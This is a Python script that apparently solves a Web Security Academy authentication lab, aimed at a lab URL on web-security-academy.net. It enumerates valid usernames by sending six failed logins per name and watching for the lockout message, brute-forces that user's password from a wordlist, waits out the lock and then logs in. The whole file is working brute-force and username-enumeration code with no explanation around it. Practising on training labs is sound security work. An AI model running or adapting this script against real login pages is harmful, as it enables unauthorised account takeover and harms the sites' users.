import requests
import time

site = 'https://0a4d00dd0465ba3680ee991600f3002d.web-security-academy.net'
login_url = f'{site}/login'

s = requests.Session()

# Step 1: Try login 6 times with each username to trigger lockout behavior
def try_target(username):
    logindata = {
        'username': username,
        'password': 'foo'
    }
    for i in range(6):
        resp = s.post(login_url, data=logindata)
    return resp.text

# Step 2: Enumerate usernames
with open('auth-lab-usernames.txt', 'r') as f:
    usernames = [line.strip() for line in f]

print("[*] Enumerating valid usernames via lockout message...\n")
valid_username = None
for name in usernames:
    result = try_target(name)
    print(f"Checked {name}")
    if 'too many incorrect login attempts' in result:
        valid_username = name
        print(f"[+] Valid username found: {valid_username}")
        break

# Step 3: Find correct password
print("\n[*] Checking password list for valid match...\n")

with open('auth-lab-passwords.txt', 'r') as f:
    passwords = [line.strip() for line in f]

correct_password = None
for pw in passwords:
    print(f"Trying password: {pw}")
    resp = s.post(login_url, data={'username': valid_username, 'password': pw})
    if 'incorrect login attempts' not in resp.text and 'Invalid username or password' not in resp.text:
        correct_password = pw
        print(f"[+] Password found: {correct_password}")
        break

# Step 4: Wait for account lock to expire
print("\n[*] Waiting 60 seconds for account lock to reset...")
time.sleep(60)

# Step 5: Final login
resp = s.post(login_url, data={'username': valid_username, 'password': correct_password})
if resp.status_code == 302 or 'My account' in resp.text:
    print("[✓] Successfully logged in — go click My Account!")
else:
    print("[!] Something went wrong. Double check username/password.")

